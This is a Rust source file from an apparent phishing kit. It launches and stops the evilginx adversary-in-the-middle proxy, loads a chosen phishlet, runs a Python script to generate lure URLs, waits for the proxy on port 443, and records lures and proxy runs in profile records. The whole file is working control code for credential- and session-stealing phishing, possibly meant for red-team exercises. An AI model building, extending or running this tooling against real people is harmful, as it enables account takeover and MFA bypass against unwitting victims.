use std::process::{Command, Stdio};
use std::time::Duration;

use regex::Regex;
use serde::Serialize;
use serde_json::json;

use crate::db;
use crate::error::{AppError, AppResult};
use crate::kit::kit_root;
use crate::lure_ops::{self, LureOps};
use crate::services::{evilginx_is_running, stop_evilginx};

#[derive(Debug, Serialize)]
pub struct StartLureResult {
    pub ok: bool,
    pub lure_url: String,
    pub stdout: String,
    pub message: String,
    pub evilginx_running: bool,
}

pub fn start_with_lure(
    profile_id: String,
    dryrun_domain: String,
    phishlet_name: String,
    lure_ops: Option<LureOps>,
) -> AppResult<StartLureResult> {
    let root = kit_root()?;
    let bin = root.join("kit/evilginx/run/evilginx");
    if !bin.is_file() {
        return Err(AppError::msg(
            "evilginx binary missing — open Advanced → Build binaries (or make build-evilginx)",
        ));
    }
    let phishlet_yaml = root.join(format!("kit/evilginx/phishlets/{phishlet_name}.yaml"));
    if !phishlet_yaml.is_file() {
        return Err(AppError::msg(format!(
            "phishlet not found: {}",
            phishlet_yaml.display()
        )));
    }

    let mut ops = if let Some(o) = lure_ops {
        o
    } else if !profile_id.is_empty() {
        if let Ok(Some(lure)) = lure_ops::get_default_lure(&profile_id) {
            lure_ops::lure_ops_from_lure(&lure)
        } else {
            db::get_profile(&profile_id)?
                .map(|p| LureOps::from_auth_meta(&p.auth_meta))
                .unwrap_or_default()
        }
    } else {
        LureOps::default()
    };

    let python = {
        let venv = root.join("venv/bin/python3");
        if venv.is_file() {
            venv
        } else {
            std::path::PathBuf::from("python3")
        }
    };

    // configure_lure.py writes config.json, starts evilginx in screen (background), prints lure
    let configure = root.join("kit/evilginx/scripts/configure_lure.py");
    if !configure.is_file() {
        return Err(AppError::msg("configure_lure.py missing"));
    }

    let ops_json = serde_json::to_string(&ops).unwrap_or_else(|_| "{}".into());

    let all_lure_ops = if !profile_id.is_empty() {
        lure_ops::lures_as_ops_list(&profile_id).unwrap_or_default()
    } else {
        vec![]
    };

    let mut cmd = Command::new(&python);
    cmd.arg(&configure)
        .arg("--phishlet")
        .arg(&phishlet_name)
        .arg("--dryrun-domain")
        .arg(&dryrun_domain);
    if all_lure_ops.len() > 1 {
        let lures_json = serde_json::to_string(&all_lure_ops)
            .map_err(|e| AppError::msg(format!("serialize lures: {e}")))?;
        cmd.arg("--lures-json").arg(&lures_json);
    } else {
        cmd.arg("--lure-ops-json").arg(&ops_json);
    }
    cmd.current_dir(&root)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if !profile_id.is_empty() {
        cmd.arg("--profile-id").arg(&profile_id);
    }
    let data_dir = crate::setup::evilginx_data_dir()?;
    let log_path = crate::setup::evilginx_log_path()?;
    let pid_path = crate::setup::evilginx_pid_path()?;
    cmd.env("KIT_ROOT", &root);
    cmd.env("PHISHKIT_ROOT", &root);
    cmd.env("EVILGINX_DATA_DIR", &data_dir);
    cmd.env("EVILGINX_LOG", &log_path);
    cmd.env("EVILGINX_PID", &pid_path);
    cmd.env("DRYRUN_DOMAIN", &dryrun_domain);
    cmd.env("PHISHLET_NAME", &phishlet_name);
    // Ensure screen/`PATH` tools are findable when launched from the GUI
    if let Ok(path) = std::env::var("PATH") {
        let extra = "/usr/local/bin:/opt/homebrew/bin:/usr/bin:/bin";
        cmd.env("PATH", format!("{extra}:{path}"));
    }

    let out = cmd.output()?;
    let stdout = String::from_utf8_lossy(&out.stdout).to_string();
    let stderr = String::from_utf8_lossy(&out.stderr).to_string();
    let combined = format!("{stdout}\n{stderr}");

    let re = Regex::new(r#"https://[^\s"']+"#).unwrap();
    let mut lure = String::new();
    // Prefer last https URL (final printed lure), skip unrelated links in logs
    for m in re.find_iter(&combined) {
        let u = m.as_str().trim_end_matches(['.', ',', ')']);
        if u.contains(&dryrun_domain) || u.contains(".phishkit") {
            lure = u.to_string();
        }
    }
    if lure.is_empty() {
        if let Some(m) = re.find(&stdout) {
            lure = m.as_str().trim_end_matches(['.', ',', ')']).to_string();
        }
    }

    // Persist resolved lure path back into auth_meta.lure_ops
    if !lure.is_empty() {
        if let Ok(url) = url::Url::parse(&lure) {
            let path = url.path().to_string();
            if !path.is_empty() && path != "/" {
                ops.path = path;
            }
        }
        ops.regenerate_path = false;
    }

    // Wait briefly for background screen process / port 443
    let mut running = false;
    for _ in 0..40 {
        let (up, _) = evilginx_is_running(&root);
        if up {
            running = true;
            break;
        }
        std::thread::sleep(Duration::from_millis(250));
    }

    if !out.status.success() && lure.is_empty() {
        return Err(AppError::msg(format!(
            "evilginx start failed:\n{combined}\n\
             Tip: port 443 may need privileges; check Advanced → Tail evilginx log."
        )));
    }

    if !profile_id.is_empty() {
        let _ = db::set_runtime_profile(&profile_id);
        if let Ok(Some(p)) = db::get_profile(&profile_id) {
            let mut meta = p.auth_meta.clone();
            if !meta.is_object() {
                meta = json!({});
            }
            ops.merge_into_auth_meta(&mut meta);
            let _ = db::update_profile_fields(
                &profile_id,
                Some(&phishlet_name),
                Some(&dryrun_domain),
                None,
                if lure.is_empty() { None } else { Some(&lure) },
                None,
                Some(&meta),
            );
            if !lure.is_empty() {
                if let Ok(Some(default_lure)) = lure_ops::get_default_lure(&profile_id) {
                    let path = ops.path.as_str();
                    let _ = lure_ops::update_lure_url(
                        &default_lure.id,
                        &lure,
                        if path.is_empty() { None } else { Some(path) },
                    );
                }
            }
        } else if !lure.is_empty() {
            let _ = db::update_profile_fields(
                &profile_id,
                Some(&phishlet_name),
                Some(&dryrun_domain),
                None,
                Some(&lure),
                None,
                None,
            );
        }
    }

    let message = if !lure.is_empty() && running {
        format!("evilginx running in background · lure: {lure}")
    } else if !lure.is_empty() {
        format!("Lure configured ({lure}) but process not detected yet — check log / port 443")
    } else if running {
        "evilginx running in background (could not parse lure URL — see log)".into()
    } else {
        "Start finished but evilginx does not appear to be running — see log".into()
    };

    if !profile_id.is_empty() && (running || !lure.is_empty()) {
        let lure_config_json = if all_lure_ops.len() > 1 {
            serde_json::to_string(&all_lure_ops).unwrap_or_else(|_| "[]".into())
        } else {
            ops_json.clone()
        };
        let _ = db::insert_proxy_run(
            &profile_id,
            &phishlet_name,
            &dryrun_domain,
            &lure_config_json,
        );
    }

    Ok(StartLureResult {
        ok: running || !lure.is_empty(),
        lure_url: lure,
        stdout: combined,
        message,
        evilginx_running: running,
    })
}

pub fn stop() -> AppResult<String> {
    let runtime_profile = db::get_runtime_profile_id()?;
    let msg = stop_evilginx()?;
    let root = kit_root()?;
    let _ = std::fs::remove_file(root.join("kit/evilginx/run/evilginx.pid"));
    if let Some(pid) = runtime_profile.filter(|s| !s.is_empty()) {
        let _ = db::stop_open_proxy_runs(&pid);
    }
    let _ = db::clear_runtime_profile();
    Ok(msg)
}
